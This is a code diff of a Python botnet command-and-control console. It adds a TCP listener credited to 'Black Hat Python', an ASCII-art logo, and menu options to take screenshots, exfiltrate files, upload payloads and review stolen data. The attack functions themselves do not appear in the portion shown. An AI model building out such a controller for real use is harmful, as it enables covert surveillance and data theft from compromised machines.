@@ -1,25 +1,20 @@
+import socket
+import threading
 from xml.dom import minidom
-
-
-def gen_bot_list():
-    # Generate the bot list
-
-    bot_list = minidom.parse('bots.xml')
-    # bots = bot_list.getElementsByTagName('bot')
-    # print('Total Bots: ', len(bots), '\n')
-    return bot_list
 
 
 def view_bots():
     # Function to view the existing bots in database
 
-    bots = gen_bot_list().getElementsByTagName('bot')
+    bot_list = minidom.parse('bots.xml')
+    bots = bot_list.getElementsByTagName('bot')
     for bot in bots:
-        print('Bot', bot.attributes['id'].value)
-        print('--> IP:', bot.attributes['ip'].value)
-        print('--> MAC:', bot.attributes['mac'].value)
-        print('--> OS:', bot.attributes['os'].value)
-        print('-' * 30, '\n')
+        print('Bot %s' % bot.attributes['id'].value)
+        print('--> IP: %s' % bot.attributes['ip'].value)
+        print('--> MAC: %s' % bot.attributes['mac'].value)
+        print('--> OS: %s' % bot.attributes['os'].value)
+        print('-' * 30)
+        print('')
 
 
 def add_bot():
@@ -54,26 +49,74 @@ def choice_error():
 
 def menu():
     # Print a menu with all the functionality.
-
     # Returns:
         # The choice of the user.
 
-    print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
+    # print('=' * 30 + '\n\t\t\tMENU\n' + '=' * 30)
     descriptions = ['View bots',
                     'Add bot',
-                    'View Monitored Devices',
+                    'View Monitored Devices',  # DEPRECATE
                     'Take Screen Shot',
                     'Exfiltrate File',
                     'Upload Payload',
                     'Review Stolen Data',
                     'Exit']
     for num, func in enumerate(descriptions):
-        print('[-->', num, func)
+        print('[%d--> %s' % (num, func))
 
     choice = input('>>> ')
+    print('')
     return choice
 
+# ---------- SCRIPT LOGO ---------- #
+print("     ******************************************************************************************************************************************************************")
+print("     *                                                                                                                                                                *")
+print("     *                                                                                                                                                                *")
+print("     *            NNN           NNN   EEEEEEEEEEE  RRRRRRRRRR       FFFFFFFFFFFF                                                                                      *")
+print("     *            NNNNN         NNN   EEEEEEEEEEE  RRRRRRRRRRRR     FFFFFFFFFFFF                                                                                      *")
+print("     *            NNN  NN       NNN   EEE          RRR        RRR   FFF                                                                                               *")
+print("     *            NNN   NN      NNN   EEE          RRR         RRR  FFF                                                                                               *")
+print("     *            NNN    NN     NNN   EEE          RRR         RRR  FFF                                                                                               *")
+print("     *            NNN     NN    NNN   EEE          RRR        RRR   FFF                                                                                               *")
+print("     *            NNN      NN   NNN   EEEEEE       RRRRRRRRRRRR     FFFFFF                                                                                            *")
+print("     *            NNN       NN  NNN   EEEEEE       RRRRRRRRRR       FFFFFF                                                                                            *")
+print("     *            NNN        NN NNN   EEE          RRR      RRR     FFF                                                                                               *")
+print("     *            NNN         NNNNN   EEE          RRR       RRR    FFF                                                                                               *")
+print("     *            NNN          NNNN   EEE          RRR        RRR   FFF                                                                                               *")
+print("     *            NNN           NNN   EEEEEEEEEEE  RRR        RRR   FFF                                                                                               *")
+print("     *            NNN           NNN   EEEEEEEEEEE  RRR         RRR  FFF                                                                                               *")
+print("     *                                                                                                                                                                *")
+print("     *                                                                                                                                                                *")
+print("     *                                                                                                                                                                *")
+print("     *                                             HHH         HHH   EEEEEEEEEEE   RRRRRRRRRR        DDDDDDDDD         EEEEEEEEEE    RRRRRRRRRR                       *")
+print("     *                                             HHH         HHH   EEEEEEEEEEE   RRRRRRRRRRRR      DDDDDDDDDDD       EEEEEEEEEE    RRRRRRRRRRRR                     *")
+print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD      DDD      EEE           RRR        RRR                   *")
+print("     *                                             HHH         HHH   EEE           RRR         RRR   DDD       DDD     EEE           RRR         RRR                  *")
+print("     *                                             HHH         HHH   EEE           RRR         RRR   DDD        DDD    EEE           RRR         RRR                  *")
+print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD         DDD   EEE           RRR        RRR                   *")
+print("     *                                             HHHHHHHHHHHHHHH   EEEEEE        RRRRRRRRRRRR      DDD         DDD   EEEEEE        RRRRRRRRRRRR                     *")
+print("     *                                             HHHHHHHHHHHHHHH   EEEEEE        RRRRRRRRRR        DDD         DDD   EEEEEE        RRRRRRRRRR                       *")
+print("     *                                             HHH         HHH   EEE           RRR      RRR      DDD        DDD    EEE           RRR      RRR                     *")
+print("     *                                             HHH         HHH   EEE           RRR       RRR     DDD       DDD     EEE           RRR       RRR                    *")
+print("     *                                             HHH         HHH   EEE           RRR        RRR    DDD      DDD      EEE           RRR        RRR                   *")
+print("     *                                             HHH         HHH   EEEEEEEEEEE   RRR        RRR    DDDDDDDDDDD       EEEEEEEEEEE   RRR        RRR                   *")
+print("     *                                             HHH         HHH   EEEEEEEEEEE   RRR         RRR   DDDDDDDDD         EEEEEEEEEEE   RRR         RRR                  *")
+print("     *                                                                                                                                                                *")
+print("     *                                                                                                                                                                *")
+print("     ******************************************************************************************************************************************************************")
 
+
+# ---------- TCP Server ---------- #
+# Code example from Black Hat Python, written by Justin Seitz and published by No Starch Press
+bind_ip = '0.0.0.0'
+bind_port = 9999
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((bind_ip, bind_port))
+server.listen(5)
+print("[*--> Listening on %s:%d\n" % (bind_ip, bind_port))
+
+
+# ---------- ITEM SELECTION TREE ---------- #
 while True:
     select = int(menu())
 
